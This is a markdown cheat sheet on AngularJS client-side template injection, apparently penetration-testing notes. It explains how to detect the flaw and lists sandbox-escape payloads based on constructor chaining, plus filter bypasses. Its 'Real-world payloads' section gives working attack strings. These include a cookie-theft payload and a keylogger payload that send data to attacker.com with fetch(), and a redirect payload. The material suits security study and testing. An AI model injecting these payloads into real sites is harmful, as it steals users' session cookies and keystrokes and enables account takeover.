# XSS via AngularJS Template Injection

## What it is

When a page uses AngularJS (`ng-app` directive) and reflects user input inside the AngularJS scope, expressions inside `{{ }}` get evaluated as JavaScript. This bypasses angle bracket and quote encoding entirely — you never need `<`, `>`, or `"`.

Called **client-side template injection (CSTI)**.

---

## Where to look

- Search bars, input fields whose value is reflected in the page
- Any element with `ng-app`, `ng-controller`, `ng-bind` in the source
- Look for `ng-binding` class on elements containing your input — confirms AngularJS evaluated it
- Check for AngularJS being loaded: `angular.js` or `angular.min.js` in page sources

**How to confirm:** Search for `{{7*7}}`. If the page shows `49` instead of `{{7*7}}`, AngularJS is evaluating your input.

---

## Sandbox escape payloads

AngularJS runs expressions in a sandboxed scope — `window`, `alert`, and direct code execution are not accessible. Use constructor chaining to reach `Function`:

```javascript
// Via $on (AngularJS scope method — already a function, one hop to Function)
{{$on.constructor('alert(1)')()}}

// Via constructor chain (starts from string/object, two hops to Function)
{{constructor.constructor('alert(1)')()}}

// Via $eval (older versions)
{{$eval.constructor('alert(1)')()}}
```

**Why constructor chaining works:**
- Every JS object has `.constructor` pointing to its creating function
- A string's constructor is `String`; `String`'s constructor is `Function`
- A function's constructor *is* `Function` directly (one hop instead of two)
- `$on` is an Angular scope method — already a function, so `$on.constructor` = `Function` immediately
- `Function('alert(1)')` creates a new function from a string and executes it
- No `<>` or `window` needed

---

## Real-world payloads

```javascript
// Cookie theft
{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}

// Redirect
{{constructor.constructor('window.location="https://attacker.com"')()}}

// Keylogger
{{constructor.constructor('document.onkeypress=function(e){fetch("https://attacker.com/?k="+e.key)}')()}}
```

---

## Why this bypasses encoding

The server HTML-encodes `<` and `>` — so `<script>` becomes `&lt;script&gt;`. But `{{` and `}}` are not HTML special characters — they pass through unencoded. AngularJS evaluates whatever is between them before the browser renders it.

No tags needed. No attributes needed. Just the expression.

---

## Detection fingerprint

| Signal | Meaning |
|--------|---------|
| `ng-app` on `<html>` or `<body>` | Entire page is in Angular scope |
| `ng-binding` class on reflected element | Angular evaluated your input |
| `{{7*7}}` renders as `49` | Expression evaluation confirmed |
| `angular.js` in page sources | AngularJS present |

---

## Filter bypasses

| Filter | Bypass |
|--------|--------|
| `{{` stripped | Try `\{\{` or look for other Angular directives |
| `constructor` blocked | `$eval('alert(1)')` (older versions) |
| Expression sandbox (newer Angular) | Version-specific scope escape — see PortSwigger research |

---

## Resources

- PortSwigger Research: [XSS without HTML — Client-Side Template Injection](https://portswigger.net/research/xss-without-html-client-side-template-injection)
- MDN: [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function)
